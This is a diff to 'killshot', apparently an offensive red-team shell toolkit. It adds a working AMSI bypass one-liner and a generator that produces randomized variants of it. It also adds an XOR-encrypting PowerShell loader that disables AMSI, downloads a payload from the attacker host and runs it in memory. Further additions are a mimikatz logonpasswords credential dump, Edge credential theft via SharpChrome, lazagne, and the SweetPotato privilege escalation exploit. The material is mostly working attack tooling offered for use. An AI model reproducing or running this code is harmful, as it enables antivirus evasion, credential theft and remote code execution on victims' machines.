@@ -32,7 +32,10 @@ show_help() {
     echo "    killshot tool <name> [opts]       Convert a single tool to shellcode"
     echo "    killshot list                     List available tools and status"
     echo "    killshot check                    Verify toolkit installation"
-    echo "    killshot serve                    Start HTTP server for workspace"
+    echo "    killshot serve [port]             Start HTTP server for workspace"
+    echo "    killshot amsi                     Print AMSI bypass one-liner for WinRM/PS"
+    echo "    killshot ps1 <file> [port]        XOR-encrypt a PS1 and generate loader stub"
+    echo "    killshot clean                    Remove all generated files from workspace"
     echo "    killshot help                     Show this help"
     echo ""
     echo "  GENERATE FLAGS (mix and match)"
@@ -40,11 +43,11 @@ show_help() {
     echo "    --implant              C2 implant shellcode (Sliver/MSF)"
     echo "    --runner               Polymorphic runner.exe"
     echo "    --stager               PowerShell stager with AMSI bypass"
-    echo "    --potato <name>        Single potato (GodPotato, PrintSpoofer, BadPotato, EfsPotato)"
+    echo "    --potato <name>        Single potato (GodPotato, PrintSpoofer, BadPotato, EfsPotato, SweetPotato)"
     echo "    --potatoes             All potato exploits"
     echo "    --tool <name>          Single tool to shellcode (see killshot list)"
     echo "    --tools                All offensive tools to shellcode"
-    echo "    --loaders              PowerShell tool loaders (Rubeus/Mimikatz fallback)"
+    echo "    --loaders              PowerShell tool loaders (Rubeus/Mimikatz PS1 fallback)"
     echo "    --msi                  MSI AppLocker bypass (wraps implant in .msi)"
     echo "    --msbuild              MSBuild XML AppLocker bypass"
     echo "    --installutil          InstallUtil C# AppLocker bypass"
@@ -70,13 +73,17 @@ show_help() {
     echo "    killshot generate -l 10.10.14.5 --stager         # Just stager.ps1"
     echo "    killshot generate -l 10.10.14.5 --runner --stager  # Runner + stager"
     echo "    killshot generate --potato GodPotato             # Single potato"
+    echo "    killshot generate --potato SweetPotato           # SweetPotato (newer)"
     echo "    killshot generate --potatoes -l 10.10.14.5       # All potatoes"
     echo "    killshot generate --tool Certify                 # Single tool"
-    echo "    killshot generate --tool Certify --params 'cas'  # Tool with custom params"
+    echo "    killshot generate --tool SharpChrome --params 'logins /browser:edge'  # Edge creds"
+    echo "    killshot generate --tool mimikatz --params 'privilege::debug sekurlsa::logonpasswords exit'"
     echo "    killshot generate --tools -l 10.10.14.5          # All tools"
     echo "    killshot generate -l 10.10.14.5 -f msf --all     # Full pipeline (MSF)"
+    echo "    killshot amsi                                    # Get AMSI bypass for session"
+    echo "    killshot ps1 /workspace/killshot/script.ps1      # Encrypt PS1 for AMSI evasion"
     echo "    killshot list                                    # Show tools"
-    echo "    killshot check                                   # Verify install"
+    echo "    killshot clean                                   # Wipe workspace"
     echo "    killshot serve                                   # HTTP server"
     echo ""
     echo "  ON TARGET"
@@ -87,6 +94,9 @@ show_help() {
     echo "    %TEMP%\\r.exe -remote http://LHOST:PORT/seatbelt.enc"
     echo "    %TEMP%\\r.exe -remote http://LHOST:PORT/godpotato.enc"
     echo "    (any .enc file works — see 'killshot list')"
+    echo ""
+    echo "  AMSI BYPASS (run in WinRM/PS session before IEX)"
+    echo '    $a=[Ref].Assembly.GetType([Text.Encoding]::UTF8.GetString([byte[]](83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115)));$f=$a.GetField([Text.Encoding]::UTF8.GetString([byte[]](97,109,115,105,73,110,105,116,70,97,105,108,101,100)),[Reflection.BindingFlags]'"'"'NonPublic,Static'"'"');$f.SetValue($null,$true)'
     echo ""
 }
 
@@ -145,6 +155,12 @@ case "${1:-}" in
         MODE="check"; shift;;
     serve|http)
         MODE="serve"; shift;;
+    amsi)
+        MODE="amsi"; shift;;
+    ps1)
+        MODE="ps1"; shift;;
+    clean)
+        MODE="clean"; shift;;
     help|--help|-help|-h)
         show_help; exit 0;;
     --list)
@@ -205,6 +221,116 @@ if [ "$MODE" = "serve" ]; then
     echo "[*] Serving $SERVE_DIR on port $PORT"
     echo "[*] Ctrl+C to stop"
     cd "$SERVE_DIR" && exec python3 -m http.server "$PORT"
+fi
+
+# ─── Mode: amsi ──────────────────────────────────────────────
+
+if [ "$MODE" = "amsi" ]; then
+    echo ""
+    echo "[*] AMSI bypass — paste into WinRM/PowerShell session:"
+    echo ""
+    # Polymorphic: generate new random variable names each time
+    python3 - << 'PYEOF'
+import random, string
+
+def rv():
+    return '$' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,8)))
+
+def ba(s):
+    return '[byte[]](' + ','.join(str(ord(c)) for c in s) + ')'
+
+va, vf, vt, vfl = rv(), rv(), rv(), rv()
+p1 = ba("System.Management.Automation.")
+p2 = ba("AmsiUtils")
+fn = ba("amsiInitFailed")
+
+print(f"{va}=[Text.Encoding]::UTF8.GetString({p1})+[Text.Encoding]::UTF8.GetString({p2})")
+print(f"{vf}=[Text.Encoding]::UTF8.GetString({fn})")
+print(f"{vt}=[Ref].Assembly.GetType({va})")
+print(f"{vfl}={vt}.GetField({vf},[Reflection.BindingFlags]'NonPublic,Static')")
+print(f"{vfl}.SetValue($null,$true)")
+PYEOF
+    echo ""
+    exit 0
+fi
+
+# ─── Mode: ps1 ───────────────────────────────────────────────
+
+if [ "$MODE" = "ps1" ]; then
+    PS1_FILE="${1:-}"
+    PS1_PORT="${2:-${HTTP_PORT:-8000}}"
+    if [ -z "$PS1_FILE" ] || [ ! -f "$PS1_FILE" ]; then
+        echo "[!] Usage: killshot ps1 <script.ps1> [http_port]"
+        exit 1
+    fi
+    PS1_BASE="$(basename "$PS1_FILE" .ps1)"
+    ENC_OUT="$WORKSPACE/${PS1_BASE}.xps1"
+    STUB_OUT="$WORKSPACE/${PS1_BASE}_loader.ps1"
+
+    python3 - "$PS1_FILE" "$ENC_OUT" "$STUB_OUT" "$LHOST" "$PS1_PORT" << 'PYEOF'
+import sys, os, random, string
+
+src_path, enc_out, stub_out, lhost, port = sys.argv[1:]
+key = random.randint(1, 254)
+
+with open(src_path, 'rb') as f:
+    raw = f.read()
+
+xored = bytes(b ^ key for b in raw)
+import base64
+b64 = base64.b64encode(xored).decode()
+
+with open(enc_out, 'w') as f:
+    f.write(b64)
+
+def rv():
+    return '$' + ''.join(random.choices(string.ascii_lowercase, k=random.randint(4,8)))
+
+def ba(s):
+    return '[byte[]](' + ','.join(str(ord(c)) for c in s) + ')'
+
+va, vf, vt, vfl = rv(), rv(), rv(), rv()
+vd, vk, vb, vs = rv(), rv(), rv(), rv()
+p1 = ba("System.Management.Automation.")
+p2 = ba("AmsiUtils")
+fn = ba("amsiInitFailed")
+
+url = f"http://{lhost}:{port}/{os.path.basename(enc_out)}"
+
+stub = f"""# killshot PS1 loader
+{va}=[Text.Encoding]::UTF8.GetString({p1})+[Text.Encoding]::UTF8.GetString({p2})
+{vf}=[Text.Encoding]::UTF8.GetString({fn})
+{vt}=[Ref].Assembly.GetType({va})
+{vfl}={vt}.GetField({vf},[Reflection.BindingFlags]'NonPublic,Static'
+{vfl}.SetValue($null,$true)
+{vb}=(New-Object Net.WebClient).DownloadString('{url}')
+{vd}=[Convert]::FromBase64String({vb})
+{vk}={key}
+{vs}=[byte[]]($vd|%{{$_ -bxor {vk}}})
+IEX([Text.Encoding]::UTF8.GetString({vs}))
+"""
+with open(stub_out, 'w') as f:
+    f.write(stub)
+
+print(f"[+] Encrypted: {enc_out}")
+print(f"[+] Loader:    {stub_out}")
+print(f"[*] XOR key:   {key}")
+print(f"")
+print(f"[*] Run loader on target:")
+print(f"    IEX (New-Object Net.WebClient).DownloadString('http://{lhost}:{port}/{os.path.basename(stub_out)}')")
+PYEOF
+    exit 0
+fi
+
+# ─── Mode: clean ─────────────────────────────────────────────
+
+if [ "$MODE" = "clean" ]; then
+    echo "[*] Cleaning workspace: $WORKSPACE"
+    rm -f "$WORKSPACE"/*.enc "$WORKSPACE"/*.exe "$WORKSPACE"/*.ps1 \
+          "$WORKSPACE"/*.msi "$WORKSPACE"/*.xml "$WORKSPACE"/*.cs  \
+          "$WORKSPACE"/*.dll "$WORKSPACE"/*.bin "$WORKSPACE"/*.xps1
+    echo "[+] Done"
+    exit 0
 fi
 
 # ─── Mode: generate ──────────────────────────────────────────
@@ -456,7 +582,7 @@ if [ "$GEN_POTATOES" = "1" ]; then
             GENERATED+=("$(basename "$POTATO_OUT")")
         else
             echo "[*] Generating all potato shellcode..."
-            for POTATO in GodPotato PrintSpoofer BadPotato EfsPotato; do
+            for POTATO in GodPotato PrintSpoofer BadPotato EfsPotato SweetPotato; do
                 POTATO_LOWER=$(echo "$POTATO" | tr 'A-Z' 'a-z')
                 python3 "$SCRIPT_DIR/gen_potato.py" \
                     -p "$POTATO" \
@@ -480,20 +606,20 @@ if [ "$GEN_TOOLS" = "1" ]; then
         TOOL_LOWER=$(echo "$SINGLE_TOOL" | tr 'A-Z' 'a-z' | tr '-' '_')
         TOOL_OUT="${OUTPUT_OVERRIDE:-$WORKSPACE/${TOOL_LOWER}.enc}"
 
-        TOOL_ARGS=""
+        TOOL_ARGS=()
         if [ -n "$TOOL_PARAMS_OVERRIDE" ]; then
-            TOOL_ARGS="--params $TOOL_PARAMS_OVERRIDE"
+            TOOL_ARGS=("--params" "$TOOL_PARAMS_OVERRIDE")
         fi
 
         # Handle ligolo-agent connect-back
-        EXTRA_ARGS=""
+        EXTRA_ARGS=()
         if [ "$SINGLE_TOOL" = "ligolo-agent" ] && [ -z "$TOOL_PARAMS_OVERRIDE" ]; then
-            EXTRA_ARGS="--lhost $LHOST --ligolo-port 11601"
+            EXTRA_ARGS=("--lhost" "$LHOST" "--ligolo-port" "11601")
         fi
 
         python3 "$SCRIPT_DIR/killshot.py" \
             --tool "$SINGLE_TOOL" \
-            $TOOL_ARGS $EXTRA_ARGS \
+            "${TOOL_ARGS[@]}" "${EXTRA_ARGS[@]}" \
             -o "$TOOL_OUT" \
             -s "$SCRIPT_DIR"
         GENERATED+=("$(basename "$TOOL_OUT")")
@@ -512,9 +638,11 @@ if [ "$GEN_TOOLS" = "1" ]; then
             ["winPEAS"]="quiet"
             ["Whisker"]="list"
             ["KrbRelayUp"]="relay"
+            ["mimikatz"]="privilege::debug sekurlsa::logonpasswords exit"
+            ["lazagne"]="all"
         )
 
-        for TOOL in Rubeus SharpHound Certify Seatbelt SharpDPAPI SharpUp SharpChrome winPEAS Whisker KrbRelayUp; do
+        for TOOL in Rubeus SharpHound Certify Seatbelt SharpDPAPI SharpUp SharpChrome winPEAS Whisker KrbRelayUp mimikatz lazagne; do
             TOOL_LOWER=$(echo "$TOOL" | tr 'A-Z' 'a-z')
             PARAMS="${TOOL_PARAMS[$TOOL]}"
             python3 killshot.py \
@@ -548,12 +676,10 @@ fi
 
 if [ "$GEN_LOADERS" = "1" ]; then
     echo ""
-    echo "[*] Generating PowerShell tool loaders..."
+    echo "[*] Generating PowerShell tool loaders (PS1 fallback for .NET tools)..."
     cd "$SCRIPT_DIR"
 
-    [ -n "$DONUT_PY" ] && echo "[+] Donut available" || echo "[!] Donut not found"
-
-    # Rubeus
+    # Rubeus — PS1 in-memory loader via [Reflection.Assembly]::Load()
     RUBEUS_SRC=""
     for p in "$SCRIPT_DIR/tools/windows/Rubeus.exe" \
              "/opt/killshot/tools/windows/Rubeus.exe" \
@@ -562,64 +688,32 @@ if [ "$GEN_LOADERS" = "1" ]; then
         [ -f "$p" ] && RUBEUS_SRC="$p" && break
     done
 
-    if [ -n "$RUBEUS_SRC" ] && [ -n "$DONUT_PY" ]; then
-        cp "$RUBEUS_SRC" "$WORKSPACE/Rubeus.exe"
-        echo "[*] Converting Rubeus.exe to shellcode via Donut..."
-        "$DONUT_PY" -c "
-import donut
-sc = donut.create(file='$RUBEUS_SRC', arch=2, params='triage', exit_opt=2)
-with open('/tmp/rubeus_donut.bin','wb') as f: f.write(sc)
-print(f'[+] Donut shellcode: {len(sc)} bytes')
-" 2>&1
-        base64 -w0 /tmp/rubeus_donut.bin > "$WORKSPACE/rubeus.enc"
-        rm -f /tmp/rubeus_donut.bin
-        echo "[+] rubeus.enc generated"
-        GENERATED+=("rubeus.enc")
-    elif [ -n "$RUBEUS_SRC" ]; then
+    if [ -n "$RUBEUS_SRC" ]; then
         cp "$RUBEUS_SRC" "$WORKSPACE/Rubeus.exe"
         python3 gen_tool_stager.py \
             --tool-url "http://$LHOST:$HTTP_PORT/Rubeus.exe" \
             --tool-name Rubeus \
             --mode dotnet \
             -o "$WORKSPACE/rubeus.ps1"
-        GENERATED+=("rubeus.ps1")
+        GENERATED+=("rubeus.ps1" "Rubeus.exe")
+    else
+        echo "[!] Rubeus.exe not found — skipping PS1 loader"
     fi
 
-    # Mimikatz
-    MIMI_SRC=""
-    for p in "$SCRIPT_DIR/tools/windows/mimikatz.exe" \
-             "/opt/killshot/tools/windows/mimikatz.exe" \
-             "/opt/my-resources/avbypass/tools/windows/mimikatz.exe"; do
-        [ -f "$p" ] && MIMI_SRC="$p" && break
+    # Mimikatz — PS1 IEX loader (Invoke-Mimikatz fallback)
+    for p in "/opt/tools/Empire/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1" \
+             "$SCRIPT_DIR/tools/windows/Invoke-Mimikatz.ps1"; do
+        if [ -f "$p" ]; then
+            cp "$p" "$WORKSPACE/Invoke-Mimikatz.ps1"
+            python3 gen_tool_stager.py \
+                --tool-url "http://$LHOST:$HTTP_PORT/Invoke-Mimikatz.ps1" \
+                --tool-name Mimikatz \
+                --mode script \
+                -o "$WORKSPACE/mimikatz.ps1"
+            GENERATED+=("mimikatz.ps1" "Invoke-Mimikatz.ps1")
+            break
+        fi
     done
-
-    if [ -n "$MIMI_SRC" ] && [ -n "$DONUT_PY" ]; then
-        echo "[*] Converting mimikatz.exe to shellcode via Donut..."
-        "$DONUT_PY" -c "
-import donut
-sc = donut.create(file='$MIMI_SRC', arch=2, params='privilege::debug sekurlsa::logonpasswords exit', exit_opt=2)
-with open('/tmp/mimi_donut.bin','wb') as f: f.write(sc)
-print(f'[+] Donut shellcode: {len(sc)} bytes')
-" 2>&1
-        base64 -w0 /tmp/mimi_donut.bin > "$WORKSPACE/mimikatz.enc"
-        rm -f /tmp/mimi_donut.bin
-        echo "[+] mimikatz.enc generated"
-        GENERATED+=("mimikatz.enc")
-    elif [ -n "$MIMI_SRC" ]; then
-        for p in "/opt/tools/Empire/empire/server/data/module_source/credentials/Invoke-Mimikatz.ps1" \
-                 "$SCRIPT_DIR/tools/windows/Invoke-Mimikatz.ps1"; do
-            if [ -f "$p" ]; then
-                cp "$p" "$WORKSPACE/Invoke-Mimikatz.ps1"
-                python3 gen_tool_stager.py \
-                    --tool-url "http://$LHOST:$HTTP_PORT/Invoke-Mimikatz.ps1" \
-                    --tool-name Mimikatz \
-                    --mode script \
-                    -o "$WORKSPACE/mimikatz.ps1"
-                GENERATED+=("mimikatz.ps1")
-                break
-            fi
-        done
-    fi
 fi
 
 # ─── AppLocker Bypass: MSI ──────────────────────────────────
